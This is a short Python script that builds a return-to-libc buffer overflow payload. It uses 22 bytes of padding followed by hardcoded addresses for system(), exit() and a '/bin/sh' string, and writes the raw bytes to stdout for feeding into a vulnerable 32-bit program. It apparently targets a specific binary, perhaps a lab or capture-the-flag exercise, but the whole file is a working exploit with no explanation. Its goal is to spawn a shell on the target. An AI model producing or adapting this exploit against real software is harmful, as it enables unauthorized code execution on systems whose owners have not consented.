import sys
import struct

shell_string = "/bin/sh"
byte_shell_string = shell_string.encode('utf-8')

system_address = struct.pack('<I', 0x8051960)
exit_address = struct.pack('<I', 0x807a074)
shell_bin_address = struct.pack('<I', 0xfff6e0c8)

padding = b'A' * 22

exploit_string = padding + system_address + exit_address + shell_bin_address + byte_shell_string

sys.stdout.buffer.write(exploit_string)
